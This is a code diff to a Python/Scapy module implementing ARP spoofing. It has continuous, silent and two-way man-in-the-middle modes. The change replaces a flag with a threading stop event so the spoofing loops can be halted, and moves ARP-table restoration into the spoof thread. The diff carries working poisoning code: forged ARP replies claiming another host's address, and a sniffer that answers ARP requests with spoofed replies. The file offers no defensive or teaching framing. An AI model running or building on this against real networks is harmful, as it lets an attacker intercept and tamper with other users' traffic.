@@ -6,7 +6,7 @@ import time
 class arp:
 
     def __init__(self):
-        self.two_way_active = False
+        self.stop_event = threading.Event()
     
     @staticmethod    
     def restore_arp_table(target_ip, spoofed_ip, iface):
@@ -29,19 +29,20 @@ class arp:
         packet = Ether(dst=target_mac, src=self_mac)/ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwdst=target_mac, hwsrc=self_mac)
         sendp(packet, verbose=False, iface=iface)
 
-    @staticmethod
-    def continuous_arp_spoof(target_ip, spoofed_ip, interval, iface):
+    def continuous_arp_spoof(self, target_ip, spoofed_ip, interval, iface):
         """
         start a loop that continuously sends spoofing packets, interval in seconds
         """
         print("Starting contiuous arp spoof from %s to %s with interval %d seconds" % (target_ip, spoofed_ip, interval))
         packet = ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
-        send(packet, inter=interval, loop=True, verbose=False, iface=iface)
+        #send(packet, inter=interval, loop=True, verbose=False, iface=iface)
+        while not self.stop_event.is_set():
+            send(packet, verbose=False, iface=iface)
+            time.sleep(interval)
         print("Stopping continuous ARP spoof")
         arp.restore_arp_table(target_ip, spoofed_ip, iface)
 
-    @staticmethod
-    def silent_arp_spoof(target_ip, spoofed_ip, iface):
+    def silent_arp_spoof(self, target_ip, spoofed_ip, iface):
         """
         Start the silent arp spoofing
         """
@@ -60,8 +61,9 @@ class arp:
                     print("Send spoofed packets: %s is at %s" % (spoofed_ip, get_if_hwaddr(iface)))
                 elif packet[ARP].psrc == spoofed_ip and packet[ARP].pdst == target_ip:
                     print("Caught arp request from %s to %s, ignoring" % ({spoofed_ip}, target_ip))
-
-        sniff(filter="arp", prn=handle_arp_packet, store=0)
+        
+        while not self.stop_event.is_set():
+            sniff(filter="arp", prn=handle_arp_packet, store=0, timeout=1)
         print("Stopping silent ARP spoofing")
         arp.restore_arp_table(target_ip, spoofed_ip, iface)
 
@@ -76,11 +78,14 @@ class arp:
         self.iface = iface
         
         def spoof_thread(ip1, ip2, interval):
-            while not self.two_way_event.is_set():
+            while not self.stop_event.is_set():
                 arp.send_spoof_packet(ip1, ip2, iface)
                 arp.send_spoof_packet(ip2, ip1, iface)
-                if self.two_way_event.wait(interval):
+                if self.stop_event.wait(interval):
                     break
+            arp.restore_arp_table(self.ip1, self.ip2, self.iface)
+            arp.restore_arp_table(self.ip2, self.ip1, self.iface)
+            
         
         thread = threading.Thread(target=spoof_thread, args=(ip1, ip2, interval))
         thread.daemon = True
@@ -88,9 +93,7 @@ class arp:
         
         return thread
         
-    def stop_two_way_spoof(self):
-        print("Stopping two way ARP spoof")
-        self.two_way_event.set()
-        arp.restore_arp_table(self.ip1, self.ip2, self.iface)
-        arp.restore_arp_table(self.ip2, self.ip1, self.iface)
+    def stop_spoof(self):
+        print("Stopping ARP spoof")
+        self.stop_event.set()
         
